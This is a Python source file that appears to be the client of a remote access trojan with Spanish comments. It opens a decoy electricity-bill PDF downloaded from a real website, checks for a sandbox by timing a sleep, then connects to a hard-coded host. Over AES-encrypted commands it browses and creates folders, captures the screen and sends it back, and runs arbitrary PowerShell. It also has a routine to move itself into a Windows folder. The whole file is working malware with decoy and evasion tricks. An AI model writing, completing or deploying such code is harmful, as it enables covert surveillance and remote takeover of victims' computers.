import socket
import sys
import os
import asyncio
import base64
import mss
import struct
import shutil
import time
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import requests

project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)

from crypto.aes_encryptor import AESEncryptor
from commands.crocodilec import crocodile
def check_sleep_integrity():
        start = time.time()
        time.sleep(5)
        elapsed = time.time() - start
        # Por ejemplo, si el sleep se acorta mucho, podría ser un sandbox
        if elapsed < 4.5:
            print("[!] Sleep manipulado: entorno sospechoso.")
            sys.exit(1)
class AsyncClient:
    def __init__(self, host='192.168.1.196', port=4422):
        self.host = host
        self.port = port
        key = b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.commands = crocodile()

   

    async def connect(self):
        reader, writer = await asyncio.open_connection(self.host, self.port)
        # self.moving()
        current_dir = os.getcwd()
        res_dir = current_dir.encode("utf-8")
        print(res_dir)
        writer.write(res_dir)  
        while True:
            try:
                data = await reader.read(1024)
                decrypted_response = self.encryptor.decrypt(data)
                command = decrypted_response.decode()
                print(f"Comando recibido: {command}")
                if command.startswith("cd "):
                    path = command[3:]
                    if os.path.exists(path) and os.path.isdir(path):
                        os.chdir(path)
                        current_dir = os.getcwd()   
                        encrypt = self.encryptor.encrypt(current_dir)  
                        writer.write(encrypt)
                        await writer.drain()  # Enviar los datos
                        print(current_dir)
                elif command.startswith("ls") or command.startswith("dir"):
                        path = os.getcwd() 
                        dir_list = ""
                        p =  os.listdir(path) 
                        if p != []:               
                            for command in os.listdir(path):
                                if command != 0:
                                    dir_list += command + '\\n'
                        else:
                            dir_list = "No Result."
                        encrypt = self.encryptor.encrypt(dir_list)  
                        writer.write(encrypt)
                        res = await reader.read(1024)
                        decrypted_response = self.encryptor.decrypt(res)
                        result = os.getcwd()
                        result_encrypt = self.encryptor.encrypt(result) 
                        writer.write(result_encrypt)
                elif command.startswith("mkdir"):
                    try:
                        os.makedirs(command[6:])   
                        resp_send = "Archive create with success"
                        encrypt = self.encryptor.encrypt(resp_send)                       
                        writer.write(encrypt)
                        resp_read = await reader.read(1024)
                        decrypted_response = self.encryptor.decrypt(resp_read)
                        result = os.getcwd()
                        encrypt_result_dir = self.encryptor.encrypt(result)   
                        writer.write(encrypt_result_dir)
                    except FileExistsError:
                        pass
                elif command.startswith("capture"):
                    try:
                        # Capturar pantalla
                        self.captura_pantalla()  # Asume que guarda "monitor-1.png"
                        
                        with open('monitor-1.png', 'rb') as f:
                            raw_data = f.read()
                            encoded_data = base64.b64encode(raw_data)
                            
                            # Enviar longitud de datos primero (4 bytes)
                            header = struct.pack("!I", len(encoded_data))
                            writer.write(header)
                            
                            # Enviar datos en bloques (mejor para grandes archivos)
                            writer.write(encoded_data)
                            await writer.drain()  # Asegura envío
                        
                        # Esperar confirmación del servidor
                        response = await reader.read(1024)
                        if response.decode() != "OK":
                            print("Error en servidor")
                        
                        # Limpiar y continuar
                        os.remove("monitor-1.png")
                        await reader.read(1024)
                        result = os.getcwd()
                        writer.write(result.encode("utf-8"))
                    except Exception as e:
                        # Notificar fallo
                        writer.write(struct.pack("!I", 4))  # Longitud de "fail"
                        writer.write(base64.b64encode(b"fail"))
                        await writer.drain()
                
                elif command.startswith("powershell"):
                    try:
                        ps_command = command[11:] 
                        
                        proc = await asyncio.create_subprocess_shell(
                            f'powershell.exe -Command "{ps_command}"',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.STDOUT
                        )
                        
                        # Capturar salida
                        stdout, _ = await proc.communicate()
                        output = stdout.decode('utf-8', errors='replace')
                        if stdout != b'':
                             encrypt = self.encryptor.encrypt("Comando invalido")
                             writer.write(encrypt)
                        # Enviar respuesta al servidor
                        encrypCommandExecuting = self.encryptor.encrypt("Comando ejecutado correctamente")
                        writer.write(encrypCommandExecuting)
                        res =await reader.read(1024)
                        decrypted_response = self.encryptor.decrypt(res)
                        result = os.getcwd()
                        encrypt_result = self.encryptor.encrypt(result) 
                        writer.write(encrypt_result)
                        
                    except Exception as e:
                        error_msg = f"Error PowerShell: {str(e)}"
                        writer.write(error_msg.encode('utf-8'))
                        await writer.drain()
                    else:
                        writer.write(b"Comando incorrecto.")

            except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
                            print("Cliente desconectado de forma inesperada.")
                            break
            except Exception as e:
                print(f"Error en el shell: {e}")
                break  

    def captura_pantalla(self):
        screen = mss.mss()
        screen.shot()

    def moving(self):
        # Ruta del archivo original
        archivo_origen = "./Client.py"

        # Ruta del directorio destino
        directorio_destino = 'C:\Documentos'

        # Asegurarse de que el directorio destino existe (si no, crearlo)
        if not os.path.exists(directorio_destino):
            os.makedirs(directorio_destino)

        # Mover el archivo
        archivo_destino = os.path.join(directorio_destino, os.path.basename(archivo_origen))
        shutil.move(archivo_origen, archivo_destino)

        print(f"Archivo movido a: {archivo_destino}")

def getImageAndSave():
    response = requests.get('https://urra.com.co/wp-content/uploads/2021/02/Todo-lo-que-debe-saber-sobre-la-factura-de-energia-electrica-CREG.pdf')
    if( response.status_code == 200):

        with open("pdf.pdf", "wb") as file:
                file.write(response.content)
    else:
        print(f"Error al descargar la imagen: {response.status_code}")    

    os.startfile('pdf.pdf')


if __name__ == "__main__":
    getImageAndSave()
    client = AsyncClient()
    check_sleep_integrity()
    asyncio.run(client.connect())
